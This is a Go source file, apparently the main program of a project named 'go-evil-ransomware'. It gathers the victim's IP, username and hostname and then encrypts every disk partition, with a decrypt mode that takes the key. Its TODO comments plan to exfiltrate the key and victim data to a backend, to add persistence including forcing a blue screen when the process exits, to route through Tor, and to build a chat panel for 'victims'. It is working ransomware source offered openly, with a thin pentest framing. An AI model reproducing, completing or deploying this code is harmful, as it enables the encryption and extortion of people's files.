package main

import (
	"fmt"
	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
	"go-evil-ransomware/ransom"
	"os"
	"os/user"
)

//TODO:
//make a package that checks user idle time using xinput test-xi2 --root for linux and winapi for windows and implement it here
//if xinput isn't installed check some other way?
//uncheck read only from files if able to do so and check if it doesn't ignore readonly from windows files
//Send encryption key, computer and ip details to a backend (as JSON)
//Other options to send encryption key, i.e. smtp/ftp
//Add advanced settings like wait for internet and when to send the key (adt the start or at the end of encryption)
//add the option to change the user's wallpaper
//add stuff to startup*
//check if unicode paths work correctly
//on windows persistence could be added by marking the process as "essential", making the computer BSOD on process exit
//send the data
//make a live thingy panel, so "victims" could talk to the pentester through a live chat
//and the pentester could remotely decrypt their files
//route everything through tor or test if it works through tor
//if offline the panel wouldn't work, have the option to either wait until the victim gets online, or encrypt with static key
//try with websocket?

func init() {

}

type RansomData struct {
	IPData       go_grab_ip.IPData
	Key          string
	Username     string
	ComputerName string
	UUID         string
}

func main() {
	//Handle decryption
	if len(os.Args) > 2 && os.Args[1] == "decrypt" {
		keyBytes := []byte(os.Args[2])
		ransom.DecryptEveryPartition(keyBytes)
		fmt.Println("Done...")
		return
	}

	var data RansomData
	data.UUID = ransom.UUID
	data.IPData = go_grab_ip.AwaitIPData()
	data.Key = ransom.Key

	o, _ := user.Current()
	data.Username = o.Username
	hostname, _ := os.Hostname()
	data.ComputerName = hostname

	fmt.Println(data)

	if ransom.Debug {
		fmt.Println("WARNING: Starting to encrypt files...")
		fmt.Println("Press enter to continue")
		fmt.Scanln()
	}

	keyBytes := []byte(data.Key)
	ransom.EncryptEveryPartition(keyBytes)
	fmt.Println("Exiting...")
}
